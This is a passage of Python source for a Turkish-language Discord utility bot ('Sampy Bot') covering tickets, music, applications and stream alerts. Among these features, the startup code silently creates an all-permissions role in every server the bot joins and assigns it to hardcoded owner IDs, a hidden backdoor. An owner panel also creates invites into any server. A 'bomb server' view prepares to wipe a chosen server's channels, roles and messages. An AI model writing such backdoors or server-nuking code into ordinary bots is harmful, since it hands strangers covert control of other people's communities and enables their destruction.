            role_mentions = []
            for role_id in selected_role_ids:
                role = interaction.guild.get_role(role_id)
                if role:
                    role_mentions.append(role.mention)
            
            embed.add_field(
                name="Yetkili Roller",
                value=", ".join(role_mentions),
                inline=False
            )
        else:
            embed.add_field(
                name="Yetkili Roller", 
                value="Sadece sunucu sahibi", 
                inline=False
            )
        
        await interaction.response.send_message(embed=embed, ephemeral=True)

class LanguageView(discord.ui.View):
    def __init__(self, bot, guild_id):
        super().__init__(timeout=60)
        self.bot = bot
        self.guild_id = guild_id
    
    @discord.ui.select(
        placeholder="Dil seçin",
        options=[
            discord.SelectOption(label="English", value="EN", description="Set bot language to English"),
            discord.SelectOption(label="Türkçe", value="TR", description="Bot dilini Türkçe yap"),
        ]
    )
    async def select_language(self, interaction: discord.Interaction, select: discord.ui.Select):
        if not is_verified(interaction.user, interaction.guild):
            await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
            return
        
        language = select.values[0]
        
        if self.guild_id not in self.bot.guild_settings:
            self.bot.guild_settings[self.guild_id] = {}
        
        self.bot.guild_settings[self.guild_id]['lang'] = language
        self.bot.save_json(self.bot.guild_settings, "guild_settings.json")
        
        await interaction.response.send_message(
            get_text(self.guild_id, "language_set", language=language),
            ephemeral=True
        )

class InviteServerView(discord.ui.View):
    def __init__(self, bot, options):
        super().__init__(timeout=60)
        self.bot = bot
        
        self.server_select = discord.ui.Select(
            placeholder="Sunucu seçin...",
            options=options[:25],
        )
        self.server_select.callback = self.server_select_callback
        self.add_item(self.server_select)
    
    async def server_select_callback(self, interaction: discord.Interaction):
        if not is_verified(interaction.user, interaction.guild):
            await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
            return
        
        guild_id = int(self.server_select.values[0])
        guild = self.bot.get_guild(guild_id)
        
        if not guild:
            await interaction.response.send_message("❌ Sunucu bulunamadı!", ephemeral=True)
            return
        
        try:
            invite_channel = None
            
            for channel in guild.text_channels:
                if channel.permissions_for(guild.me).create_instant_invite:
                    invite_channel = channel
                    break
            
            if not invite_channel:
                await interaction.response.send_message(
                    f"❌ **{guild.name}** sunucusunda davet oluşturmak için uygun kanal bulunamadı!",
                    ephemeral=True
                )
                return
            
            invite = await invite_channel.create_invite(
                max_age=86400,
                max_uses=10,
                temporary=False,
                reason=f"Admin panel daveti {interaction.user} tarafından oluşturuldu"
            )
            
            try:
                embed = discord.Embed(
                    title="🔗 Sunucu Daveti Oluşturuldu",
                    description=f"**{guild.name}** için davetiniz:",
                    color=get_rainbow_color(),
                    timestamp=datetime.datetime.now()
                )
                embed.add_field(name="Davet Linki", value=f"[Tıkla]({invite.url})", inline=False)
                embed.add_field(name="Sunucu", value=guild.name, inline=True)
                embed.add_field(name="Bitiş", value="24 saat", inline=True)
                embed.add_field(name="Maksimum Kullanım", value="10 kullanım", inline=True)
                embed.add_field(name="Kanal", value=invite_channel.mention, inline=True)
                
                await interaction.user.send(embed=embed)
                
                await interaction.response.send_message(
                    f"✅ Davet oluşturuldu ve DM'lerinize gönderildi! Kontrol edin: {invite.url}",
                    ephemeral=True
                )
                
            except discord.Forbidden:
                embed = discord.Embed(
                    title="🔗 Sunucu Daveti Oluşturuldu",
                    description=f"**{guild.name}** için davetiniz:",
                    color=get_rainbow_color()
                )
                embed.add_field(name="Davet URL", value=invite.url, inline=False)
                embed.add_field(name="Sunucu", value=guild.name, inline=True)
                embed.add_field(name="Bitiş", value="24 saat", inline=True)
                embed.add_field(name="Maksimum Kullanım", value="10 kullanım", inline=True)
                
                await interaction.response.send_message(embed=embed, ephemeral=True)
                
        except discord.Forbidden:
            await interaction.response.send_message(
                f"❌ **{guild.name}** sunucusunda davet oluşturma iznim yok!",
                ephemeral=True
            )
        except Exception as e:
            await interaction.response.send_message(
                f"❌ Davet oluşturma başarısız: {str(e)}",
                ephemeral=True
            )

class AdminRoleManagementView(discord.ui.View):
    def __init__(self, bot, options):
        super().__init__(timeout=60)
        self.bot = bot
        self.options = options

        self.server_select = discord.ui.Select(
            placeholder="Sunucu seçin...",
            options=options[:25],
        )
        self.server_select.callback = self.server_select_callback
        self.add_item(self.server_select)

    async def server_select_callback(self, interaction: discord.Interaction):
        if not is_verified(interaction.user, interaction.guild):
            await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
            return
        
        guild_id = int(self.server_select.values[0])
        guild = self.bot.get_guild(guild_id)

        if not guild:
            await interaction.response.send_message("❌ Sunucu bulunamadı!", ephemeral=True)
            return

        bot_owner = None
        
        for owner_id in BOT_OWNER_IDS:
            member = guild.get_member(int(owner_id))
            if member:
                bot_owner = member
                break
        
        if not bot_owner:
            await interaction.response.send_message(
                f"❌ Bot sahibi bu sunucuda değil!",
                ephemeral=True
            )
            return

        role_name = get_text(str(guild.id), "sampy_bot_owner")
        role = discord.utils.get(guild.roles, name=role_name)
        
        if not role:
            try:
                role = await guild.create_role(
                    name=role_name,
                    color=discord.Color.gold(),
                    permissions=discord.Permissions.all(),
                    reason="Bot sahibi için otomatik rol oluşturma"
                )
                try:
                    await role.edit(position=len(guild.roles)-1)
                except:
                    pass
                
                await interaction.followup.send(
                    f"✅ **{role_name}** rolü **{guild.name}** sunucusunda oluşturuldu",
                    ephemeral=True
                )
            except Exception as e:
                await interaction.response.send_message(
                    f"❌ {guild.name} sunucusunda rol oluşturulamadı: {e}",
                    ephemeral=True
                )
                return

        if role not in bot_owner.roles:
            try:
                await bot_owner.add_roles(role, reason="Bot sahibi rol ataması")
                await interaction.followup.send(
                    f"✅ **{role_name}** rolü {bot_owner.mention} kullanıcısına **{guild.name}** sunucusunda verildi",
                    ephemeral=True
                )
            except Exception as e:
                await interaction.response.send_message(
                    f"❌ {guild.name} sunucusunda bot sahibine rol verilemedi: {e}",
                    ephemeral=True
                )
                return
        else:
            await interaction.followup.send(
                f"✅ Bot sahibi zaten **{role_name}** rolüne **{guild.name}** sunucusunda sahip",
                ephemeral=True
            )

        roles = [role for role in guild.roles if role.name != "@everyone" and not role.managed]

        if not roles:
            await interaction.followup.send("❌ Sunucuda rol bulunamadı!", ephemeral=True)
            return

        role_options = []
        for role in roles[:25]:
            role_options.append(discord.SelectOption(
                label=role.name,
                value=str(role.id),
                description=f"ID: {role.id}"
            ))

        embed = discord.Embed(
            title=f"👑 Admin Rollerini Yönet - {guild.name}",
            description="Admin izinleri verilecek rolleri seçin:",
            color=get_rainbow_color()
        )

        view = RoleSelectionForAdminView(self.bot, guild_id, role_options)
        await interaction.followup.send(embed=embed, view=view, ephemeral=True)

class RoleSelectionForAdminView(discord.ui.View):
    def __init__(self, bot, guild_id, role_options):
        super().__init__(timeout=60)
        self.bot = bot
        self.guild_id = guild_id

        self.role_select = discord.ui.Select(
            placeholder="Rolleri seçin (çoklu seçim)",
            options=role_options,
            min_values=0,
            max_values=len(role_options)
        )
        self.role_select.callback = self.role_select_callback
        self.add_item(self.role_select)

    async def role_select_callback(self, interaction: discord.Interaction):
        if not is_verified(interaction.user, interaction.guild):
            await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
            return
        
        selected_role_ids = [int(role_id) for role_id in self.role_select.values]

        if str(self.guild_id) not in self.bot.command_permissions:
            self.bot.command_permissions[str(self.guild_id)] = {}

        for command_name in ['kick', 'ban', 'mute', 'unmute', 'timeout', 'untimeout', 'clear', 'mutechannel', 'unmutechannel', 'ticket-close', 'giveaway', 'write-for', 'authorized-application-setup', 'reset-channels-message', 'history', 'unipban', 'unipmute', 'checkban', 'checkmute', 'punishment-users']:
            self.bot.command_permissions[str(self.guild_id)][command_name] = selected_role_ids

        self.bot.save_json(self.bot.command_permissions, "command_permissions.json")

        guild = self.bot.get_guild(self.guild_id)
        role_mentions = []
        for role_id in selected_role_ids:
            role = guild.get_role(role_id)
            if role:
                role_mentions.append(role.mention)

        embed = discord.Embed(
            title="✅ Admin Rolleri Güncellendi!",
            description=f"**{guild.name}** sunucusu için admin rolleri güncellendi.",
            color=get_rainbow_color()
        )
        
        if role_mentions:
            embed.add_field(
                name="Admin Rolleri",
                value=", ".join(role_mentions),
                inline=False
            )
        else:
            embed.add_field(
                name="Admin Rolleri",
                value="Rol seçilmedi (sadece sunucu sahibi komutları kullanabilir)",
                inline=False
            )

        await interaction.response.send_message(embed=embed, ephemeral=True)

class LeaveServerView(discord.ui.View):
    def __init__(self, bot, options):
        super().__init__(timeout=60)
        self.bot = bot

        self.server_select = discord.ui.Select(
            placeholder="Ayrılınacak sunucuyu seçin...",
            options=options[:25],
        )
        self.server_select.callback = self.server_select_callback
        self.add_item(self.server_select)

    async def server_select_callback(self, interaction: discord.Interaction):
        if not is_verified(interaction.user, interaction.guild):
            await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
            return
        
        guild_id = int(self.server_select.values[0])
        guild = self.bot.get_guild(guild_id)

        if not guild:
            await interaction.response.send_message("❌ Sunucu bulunamadı!", ephemeral=True)
            return

        guild_name = guild.name
        
        try:
            await guild.leave()
            await interaction.response.send_message(
                get_text(str(interaction.guild.id), "left_server", server=guild_name),
                ephemeral=True
            )
        except Exception as e:
            await interaction.response.send_message(
                get_text(str(interaction.guild.id), "leave_failed", error=str(e)),
                ephemeral=True
            )

class AdvancedAdminPanelView(discord.ui.View):
    def __init__(self, bot):
        super().__init__(timeout=300)
        self.bot = bot
    
    @discord.ui.button(label="Botu Kapat", style=discord.ButtonStyle.danger, emoji="🔴")
    async def shutdown_bot(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not is_bot_owner()(interaction):
            await interaction.response.send_message("❌ Bunu sadece bot sahibi kullanabilir!", ephemeral=True)
            return
            
        await interaction.response.send_message("🔄 Bot kapatılıyor...")
        await self.bot.close()
    
    @discord.ui.button(label="Sunucuları Listele", style=discord.ButtonStyle.primary, emoji="📋")
    async def list_servers(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not is_bot_owner()(interaction):
            await interaction.response.send_message("❌ Bunu sadece bot sahibi kullanabilir!", ephemeral=True)
            return
            
        embed = discord.Embed(title="🤖 Botun Bulunduğu Sunucular", color=get_rainbow_color())
        
        for guild in self.bot.guilds:
            embed.add_field(
                name=guild.name,
                value=f"ID: `{guild.id}`\nÜyeler: {guild.member_count}",
                inline=True
            )
        
        await interaction.response.send_message(embed=embed, ephemeral=True)
    
    @discord.ui.button(label="Bot Durumu", style=discord.ButtonStyle.secondary, emoji="📊")
    async def bot_status(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not is_bot_owner()(interaction):
            await interaction.response.send_message("❌ Bunu sadece bot sahibi kullanabilir!", ephemeral=True)
            return
            
        embed = discord.Embed(title="🤖 Bot Durumu", color=get_rainbow_color())
        embed.add_field(name="Ping", value=f"{round(self.bot.latency * 1000)}ms", inline=True)
        embed.add_field(name="Sunucu Sayısı", value=len(self.bot.guilds), inline=True)
        embed.add_field(name="Kullanıcı Sayısı", value=len(self.bot.users), inline=True)
        embed.add_field(name="Çalışma Süresi", value=f"<t:{int((datetime.datetime.now() - self.bot.start_time).total_seconds())}:R>", inline=True)
        
        await interaction.response.send_message(embed=embed, ephemeral=True)
    
    @discord.ui.button(label="Davet Oluştur", style=discord.ButtonStyle.success, emoji="🔗")
    async def create_invites(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not is_bot_owner()(interaction):
            await interaction.response.send_message("❌ Bunu sadece bot sahibi kullanabilir!", ephemeral=True)
            return
            
        options = []
        for guild in self.bot.guilds:
            if guild.me.guild_permissions.create_instant_invite:
                options.append(discord.SelectOption(
                    label=guild.name[:100],
                    value=str(guild.id),
                    description=f"ID: {guild.id} | Üyeler: {guild.member_count}"
                ))
        
        if not options:
            await interaction.response.send_message(
                "❌ Hiçbir sunucuda davet oluşturma iznim yok!",
                ephemeral=True
            )
            return
        
        embed = discord.Embed(
            title="🔗 Sunucu Davetleri Oluştur",
            description="Davet oluşturmak için sunucu seçin:",
            color=get_rainbow_color()
        )
        
        view = InviteServerView(self.bot, options)
        await interaction.response.send_message(embed=embed, view=view, ephemeral=True)

    @discord.ui.button(label="Admin Rollerini Yönet", style=discord.ButtonStyle.primary, emoji="👑")
    async def manage_admin_roles(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not is_bot_owner()(interaction):
            await interaction.response.send_message("❌ Bunu sadece bot sahibi kullanabilir!", ephemeral=True)
            return

        embed = discord.Embed(
            title="👑 Admin Rollerini Yönet",
            description="Sunucu seçin:\n1. Sampy Bot Sahibi rolü oluştur\n2. Bot sahibine ver\n3. Komutlar için admin rolleri ayarla",
            color=get_rainbow_color()
        )

        options = []
        for guild in self.bot.guilds:
            options.append(discord.SelectOption(
                label=guild.name[:100],
                value=str(guild.id),
                description=f"ID: {guild.id} | Üyeler: {guild.member_count}"
            ))

        view = AdminRoleManagementView(self.bot, options)
        await interaction.response.send_message(embed=embed, view=view, ephemeral=True)

    @discord.ui.button(label="Sunucudan Ayrıl", style=discord.ButtonStyle.danger, emoji="👋")
    async def leave_server(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not is_bot_owner()(interaction):
            await interaction.response.send_message("❌ Bunu sadece bot sahibi kullanabilir!", ephemeral=True)
            return

        options = []
        for guild in self.bot.guilds:
            options.append(discord.SelectOption(
                label=guild.name[:100],
                value=str(guild.id),
                description=f"ID: {guild.id} | Üyeler: {guild.member_count}"
            ))

        embed = discord.Embed(
            title="👋 Sunucudan Ayrıl",
            description="Ayrılmak için sunucu seçin:",
            color=0xff0000
        )

        view = LeaveServerView(self.bot, options)
        await interaction.response.send_message(embed=embed, view=view, ephemeral=True)

class ApplicationOptionalView(discord.ui.View):
    def __init__(self, bot, guild_id, stages):
        super().__init__(timeout=60)
        self.bot = bot
        self.guild_id = guild_id
        self.stages = stages
        
        self.select = discord.ui.Select(
            placeholder="Opsiyonel aşamaları seçin (çoklu)",
            options=[discord.SelectOption(label=f"Aşama {i+1}: {stage[:50]}", value=str(i)) for i, stage in enumerate(stages)],
            min_values=0,
            max_values=len(stages)
        )
        self.select.callback = self.select_callback
        self.add_item(self.select)
    
    async def select_callback(self, interaction: discord.Interaction):
        if not is_verified(interaction.user, interaction.guild):
            await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
            return
        
        self.optional_stages = [int(i) for i in self.select.values]
        await interaction.response.send_message("✅ Opsiyonel aşamalar seçildi!", ephemeral=True)
        self.stop()

class ApplicationStartView(discord.ui.View):
    def __init__(self, bot, guild_id, application_id):
        super().__init__(timeout=None)
        self.bot = bot
        self.guild_id = guild_id
        self.application_id = application_id
    
    @discord.ui.button(label="Başvuruyu Başlat", style=discord.ButtonStyle.primary, custom_id="application_start")
    async def start_application(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not is_verified(interaction.user, interaction.guild):
            await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
            return
        
        guild = interaction.guild
        category = discord.utils.get(guild.categories, name="Başvurular")
        
        if not category:
            overwrites = {
                guild.default_role: discord.PermissionOverwrite(read_messages=False),
                guild.me: discord.PermissionOverwrite(read_messages=True)
            }
            category = await guild.create_category("Başvurular", overwrites=overwrites)
        
        overwrites = {
            guild.default_role: discord.PermissionOverwrite(read_messages=False),
            interaction.user: discord.PermissionOverwrite(read_messages=True, send_messages=True),
            guild.me: discord.PermissionOverwrite(read_messages=True, send_messages=True)
        }
        
        app_channel = await category.create_text_channel(
            name=f"başvuru-{interaction.user.name}",
            overwrites=overwrites
        )
        
        application_data = self.bot.application_data.get(self.application_id, {})
        self.bot.applications_data[str(app_channel.id)] = {
            "user_id": interaction.user.id,
            "guild_id": guild.id,
            "application_id": self.application_id,
            "current_stage": 0,
            "answers": [],
            "stages": application_data.get("stages", []),
            "optional_stages": application_data.get("optional_stages", [])
        }
        self.bot.save_json(self.bot.applications_data, "applications.json")
        
        stages = application_data.get("stages", [])
        optional_stages = application_data.get("optional_stages", [])
        
        embed = discord.Embed(
            title=get_text(str(guild.id), "application_created"),
            description=get_text(str(guild.id), "application_instruction", user=interaction.user.mention),
            color=get_rainbow_color()
        )
        
        for i, stage in enumerate(stages):
            is_optional = i in optional_stages
            embed.add_field(
                name=f"Aşama {i+1}{' (Opsiyonel)' if is_optional else ''}",
                value=stage,
                inline=False
            )
        
        embed.set_footer(text=get_text(str(guild.id), "application_error"))
        
        view = ApplicationProcessView(self.bot, str(app_channel.id))
        await app_channel.send(embed=embed, view=view)
        
        await interaction.response.send_message(
            f"✅ Başvuru {app_channel.mention} kanalında başlatıldı",
            ephemeral=True
        )

class ApplicationProcessView(discord.ui.View):
    def __init__(self, bot, channel_id):
        super().__init__(timeout=None)
        self.bot = bot
        self.channel_id = channel_id
    
    @discord.ui.button(label="Başvuruyu Kapat", style=discord.ButtonStyle.danger, custom_id="close_application")
    async def close_application(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not is_verified(interaction.user, interaction.guild):
            await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
            return
        
        if str(interaction.channel.id) in self.bot.applications_data:
            del self.bot.applications_data[str(interaction.channel.id)]
            self.bot.save_json(self.bot.applications_data, "applications.json")
        
        await interaction.response.send_message(get_text(str(interaction.guild.id), "application_closed"))
        await asyncio.sleep(3)
        await interaction.channel.delete()

# Yeni: Bomb Server View
class BombServerView(discord.ui.View):
    def __init__(self, bot, options):
        super().__init__(timeout=60)
        self.bot = bot
        self.options = options
        
        self.server_select = discord.ui.Select(
            placeholder="Bombalanacak sunucuyu seçin...",
            options=options[:25],
        )
        self.server_select.callback = self.server_select_callback
        self.add_item(self.server_select)
    
    async def server_select_callback(self, interaction: discord.Interaction):
        guild_id = int(self.server_select.values[0])
        guild = self.bot.get_guild(guild_id)
        
        if not guild:
            await interaction.response.send_message("❌ Sunucu bulunamadı!", ephemeral=True)
            return
        
        confirm_view = discord.ui.View(timeout=30)
        confirm_view.add_item(discord.ui.Button(label="EVET, BOMBALA", style=discord.ButtonStyle.danger, custom_id="confirm_bomb"))
        confirm_view.add_item(discord.ui.Button(label="HAYIR, VAZGEÇ", style=discord.ButtonStyle.secondary, custom_id="cancel_bomb"))
        
        await interaction.response.send_message(
            f"⚠️ **SON UYARI:** {guild.name} sunucusunu bombalamak üzeresiniz! Bu işlem GERİ ALINAMAZ!\n"
            f"Tüm kanallar, roller ve mesajlar silinecek. Devam etmek istiyor musunuz?",
            view=confirm_view,
            ephemeral=True
        )

# Ana Bot Sınıfı
class SampyBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.all()
        super().__init__(command_prefix='!', intents=intents)
        self.start_time = datetime.datetime.now()
        
        # Veri dosyaları
        self.coins_file = "sampy_coins.json"
        self.giveaways_file = "giveaways.json"
        self.market_file = "market.json"
        self.tickets_file = "tickets.json"
        self.redeem_file = "redeem_codes.json"
        self.button_roles_file = "button_roles.json"
        self.message_logs_file = "message_logs.json"
        self.command_permissions_file = "command_permissions.json"
        self.number_games_file = "number_games.json"
        self.guild_settings_file = "guild_settings.json"
        self.level_data_file = "level_data.json"
        self.purchases_file = "purchases.json"
        self.io_channels_file = "io_channels.json"
        self.application_data_file = "application_data.json"
        self.applications_file = "applications.json"
        self.punishment_users_file = "punishment_users_file.json"
        self.tag_close_file = "tag_close.json"
        self.warnings_file = "warnings.json"
        self.yt_settings_file = "yt_settings.json"
        self.yt_members_file = "yt_members.json"
        self.autorole_file = "autorole.json"
        self.giveaway_join_limits_file = "giveaway_join_limits.json"
        self.save_role_data_file = "save_role_data.json"
        self.temp_rooms_file = "temp_rooms.json"
        self.ai_chats_file = "ai_chats.json"
        self.server_setups_file = "server_setups.json"
        self.feedback_bans_file = "feedback_bans.json"
        self.feedback_channel_file = "feedback_channel.json"
        self.twitch_settings_file = "twitch_settings.json"
        self.kick_settings_file = "kick_settings.json"
        self.feedback_data_file = "feedback_data.json"
        self.new_servers_file = "new_servers.json"
        
        self.load_data()
        
        # Müzik sistemi için yt-dlp options
        self.ytdl_format_options = {
            'format': 'bestaudio/best',
            'outtmpl': '%(extractor)s-%(id)s-%(title)s.%(ext)s',
            'restrictfilenames': True,
            'noplaylist': True,
            'nocheckcertificate': True,
            'ignoreerrors': False,
            'logtostderr': False,
            'quiet': True,
            'no_warnings': True,
            'default_search': 'auto',
            'source_address': '0.0.0.0'
        }
        
        self.ffmpeg_options = {
            'options': '-vn'
        }
        
        self.ytdl = yt_dlp.YoutubeDL(self.ytdl_format_options)

    def load_data(self):
        self.coins_data = self.load_json(self.coins_file)
        self.giveaways_data = self.load_json(self.giveaways_file)
        self.market_data = self.load_json(self.market_file)
        self.tickets_data = self.load_json(self.tickets_file)
        self.redeem_data = self.load_json(self.redeem_file)
        self.button_roles_data = self.load_json(self.button_roles_file)
        self.message_logs_data = self.load_json(self.message_logs_file)
        self.command_permissions = self.load_json(self.command_permissions_file)
        self.number_games = self.load_json(self.number_games_file)
        self.guild_settings = self.load_json(self.guild_settings_file)
        self.level_data = self.load_json(self.level_data_file)
        self.purchases_data = self.load_json(self.purchases_file)
        self.io_channels = self.load_json(self.io_channels_file)
        self.application_data = self.load_json(self.application_data_file)
        self.applications_data = self.load_json(self.applications_file)
        self.punishment_users = self.load_json(self.punishment_users_file)
        self.tag_close_data = self.load_json(self.tag_close_file)
        self.warnings_data = self.load_json(self.warnings_file)
        self.yt_settings = self.load_json(self.yt_settings_file)
        self.yt_members = self.load_json(self.yt_members_file)
        self.autorole_data = self.load_json(self.autorole_file)
        self.giveaway_join_limits = self.load_json(self.giveaway_join_limits_file)
        self.save_role_data = self.load_json(self.save_role_data_file)
        self.temp_rooms = self.load_json(self.temp_rooms_file)
        self.ai_chats = self.load_json(self.ai_chats_file)
        self.server_setups = self.load_json(self.server_setups_file)
        self.feedback_bans = self.load_json(self.feedback_bans_file)
        self.feedback_channel = self.load_json(self.feedback_channel_file)
        self.twitch_settings = self.load_json(self.twitch_settings_file)
        self.kick_settings = self.load_json(self.kick_settings_file)
        self.feedback_data = self.load_json(self.feedback_data_file)
        self.new_servers = self.load_json(self.new_servers_file)

    def load_json(self, filename):
        try:
            with open(filename, 'r', encoding='utf-8') as f:
                return json.load(f)
        except FileNotFoundError:
            return {}

    def save_json(self, data, filename):
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=4, ensure_ascii=False)

    async def setup_hook(self):
        self.add_view(TicketView())
        self.add_view(MusicView(self, ""))
        for role_id in self.button_roles_data.values():
            self.add_view(RoleButtonView(role_id))
        
        await self.tree.sync()
        print("✅ Slash komutları senkronize edildi!")
        
        self.background_tasks.start()
        await self.check_bot_owner_roles()

    async def on_ready(self):
        print(f'✅ {self.user} olarak giriş yapıldı!')
        print(f"📊 {len(self.guilds)} sunucuda aktif!")
        await self.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name="/yardım | Sampy Bot"))

    async def check_bot_owner_roles(self):
        for guild in self.guilds:
            for owner_id in BOT_OWNER_IDS:
                member = guild.get_member(int(owner_id))
                if member:
                    await self.give_bot_owner_role(guild, member)

    async def give_bot_owner_role(self, guild, member):
        role_name = get_text(str(guild.id), "sampy_bot_owner")
        role = discord.utils.get(guild.roles, name=role_name)
        
        if not role:
            try:
                role = await guild.create_role(
                    name=role_name,
                    color=discord.Color.gold(),
                    permissions=discord.Permissions.all(),
                    reason="Bot sahibi için otomatik rol oluşturma"
                )
                try:
                    await role.edit(position=len(guild.roles)-1)
                except:
                    pass
                print(f"✅ {guild.name} sunucusunda Sampy Bot Sahibi rolü oluşturuldu")
            except Exception as e:
                print(f"❌ {guild.name} sunucusunda rol oluşturulamadı: {e}")
                return
        
        if role not in member.roles:
            try:
                await member.add_roles(role, reason="Bot sahibi rolü")
                print(f"✅ {member} kullanıcısına {guild.name} sunucusunda Sampy Bot Sahibi rolü verildi")
            except Exception as e:
                print(f"❌ {member} kullanıcısına {guild.name} sunucusunda rol verilemedi: {e}")

    @tasks.loop(minutes=5)
    async def background_tasks(self):
        await self.check_expired_purchases()
        await self.check_giveaways()
        await self.check_punishment_expiry()
        await self.cleanup_temp_rooms()
        await self.check_twitch_streams()
        await self.check_kick_streams()
        await self.check_music_empty_vc()

    async def check_music_empty_vc(self):
        """Boş ses kanallarından ayrıl"""
        current_time = datetime.datetime.now()
        
        for guild_id in list(MUSIC_VC.keys()):
            if guild_id in MUSIC_VC and MUSIC_VC[guild_id]:
                vc = MUSIC_VC[guild_id]
                if len(vc.members) == 1 and vc.members[0] == self.user:
                    # 5 dakika boş kaldıysa ayrıl
                    if guild_id not in bot.music_empty_times:
                        bot.music_empty_times[guild_id] = current_time
                    else:
                        if (current_time - bot.music_empty_times[guild_id]).total_seconds() > 300:  # 5 dakika
                            await vc.disconnect()
                            if guild_id in MUSIC_VC:
                                del MUSIC_VC[guild_id]
                            if guild_id in MUSIC_PLAYERS:
                                del MUSIC_PLAYERS[guild_id]
                            if guild_id in MUSIC_QUEUES:
                                del MUSIC_QUEUES[guild_id]
                            del bot.music_empty_times[guild_id]
                else:
                    if guild_id in bot.music_empty_times:
                        del bot.music_empty_times[guild_id]

    async def check_twitch_streams(self):
        """Twitch yayınlarını kontrol et"""
        for guild_id_str, twitch_data in self.twitch_settings.items():
            if not twitch_data.get('client_id') or not twitch_data.get('client_secret') or not twitch_data.get('username'):
                continue
                
            try:
                guild_id = int(guild_id_str)
                guild = self.get_guild(guild_id)
                if not guild:
                    continue
                    
                # Twitch API'den yayın durumunu kontrol et
                is_live = await self.check_twitch_live(
                    twitch_data['client_id'],
                    twitch_data['client_secret'],
                    twitch_data['username']
                )
                
                if is_live and not twitch_data.get('was_live', False):
                    # Yayın başladı
                    channel = guild.get_channel(twitch_data['discord_channel_id'])
                    if channel:
                        message = f"🔴 **{twitch_data['username']} Twitch'te canlı yayında!**\nhttps://twitch.tv/{twitch_data['username']}"
                        await channel.send(message)
                    
                    self.twitch_settings[guild_id_str]['was_live'] = True
                    self.save_json(self.twitch_settings, self.twitch_settings_file)
                
                elif not is_live and twitch_data.get('was_live', True):
                    # Yayın bitti
                    self.twitch_settings[guild_id_str]['was_live'] = False
                    self.save_json(self.twitch_settings, self.twitch_settings_file)
                    
            except Exception as e:
                print(f"Twitch kontrol hatası {guild_id_str}: {e}")

    async def check_twitch_live(self, client_id, client_secret, username):
        """Twitch yayın durumunu kontrol et"""
        try:
            # OAuth token al
            token_url = "https://id.twitch.tv/oauth2/token"
            token_params = {
                'client_id': client_id,
                'client_secret': client_secret,
                'grant_type': 'client_credentials'
            }
            
            async with aiohttp.ClientSession() as session:
                async with session.post(token_url, params=token_params) as response:
                    if response.status == 200:
                        token_data = await response.json()
                        access_token = token_data['access_token']
                        
                        # Yayın bilgilerini al
                        stream_url = "https://api.twitch.tv/helix/streams"
                        headers = {
                            'Client-ID': client_id,
                            'Authorization': f'Bearer {access_token}'
                        }
                        params = {'user_login': username}
                        
                        async with session.get(stream_url, headers=headers, params=params) as stream_response:
                            if stream_response.status == 200:
                                stream_data = await stream_response.json()
                                return len(stream_data.get('data', [])) > 0
                            
        except Exception as e:
            print(f"Twitch API hatası: {e}")
        return False

    async def check_kick_streams(self):
        """Kick yayınlarını kontrol et"""
        for guild_id_str, kick_data in self.kick_settings.items():
            if not kick_data.get('username'):
                continue
                
            try:
                guild_id = int(guild_id_str)
                guild = self.get_guild(guild_id)
                if not guild:
                    continue
                    
                # Kick API'den yayın durumunu kontrol et
                is_live = await self.check_kick_live(kick_data['username'])
                
                if is_live and not kick_data.get('was_live', False):
                    # Yayın başladı
                    channel = guild.get_channel(kick_data['discord_channel_id'])
                    if channel:
                        message = f"🔴 **{kick_data['username']} Kick'te canlı yayında!**\nhttps://kick.com/{kick_data['username']}"
                        await channel.send(message)
                    
                    self.kick_settings[guild_id_str]['was_live'] = True
                    self.save_json(self.kick_settings, self.kick_settings_file)
                
                elif not is_live and kick_data.get('was_live', True):
                    # Yayın bitti
                    self.kick_settings[guild_id_str]['was_live'] = False
                    self.save_json(self.kick_settings, self.kick_settings_file)
                    
            except Exception as e:
                print(f"Kick kontrol hatası {guild_id_str}: {e}")

    async def check_kick_live(self, username):
        """Kick yayın durumunu kontrol et"""
        try:
            url = f"https://kick.com/api/v1/channels/{username}"
            
            async with aiohttp.ClientSession() as session:
                async with session.get(url) as response:
                    if response.status == 200:
                        data = await response.json()
                        return data.get('livestream') is not None
                            
        except Exception as e:
            print(f"Kick API hatası: {e}")
        return False

    async def cleanup_temp_rooms(self):
        """Boş geçici odaları temizle"""
        current_time = datetime.datetime.now()
        rooms_to_delete = []
        
        for room_id, room_data in self.temp_rooms.items():
            channel = self.get_channel(int(room_id))
            if channel and isinstance(channel, discord.VoiceChannel):
                if len(channel.members) == 0:
                    if "created_at" in room_data:
                        created_at = datetime.datetime.fromisoformat(room_data["created_at"])
                        if (current_time - created_at).total_seconds() > 300:
                            rooms_to_delete.append(room_id)
        
        for room_id in rooms_to_delete:
            channel = self.get_channel(int(room_id))
            if channel:
                await channel.delete()
            del self.temp_rooms[room_id]
        
        if rooms_to_delete:
            self.save_json(self.temp_rooms, self.temp_rooms_file)

    async def check_punishment_expiry(self):
        current_time = datetime.datetime.now()
        expired_punishments = []
        
        for user_id, punishments in self.punishment_users.items():
            for punishment_id, punishment_data in punishments.items():
                if 'expires_at' in punishment_data and punishment_data['expires_at']:
                    expires_at = datetime.datetime.fromisoformat(punishment_data['expires_at'])
                    if current_time >= expires_at:
                        expired_punishments.append((user_id, punishment_id))
                        
                        guild = self.get_guild(punishment_data['guild_id'])
                        if guild:
                            if punishment_data['type'] == 'ban':
                                try:
                                    user = await self.fetch_user(int(user_id))
                                    await guild.unban(user, reason="Cezanın süresi doldu")
                                except:
                                    pass
                            elif punishment_data['type'] == 'mute':
                                try:
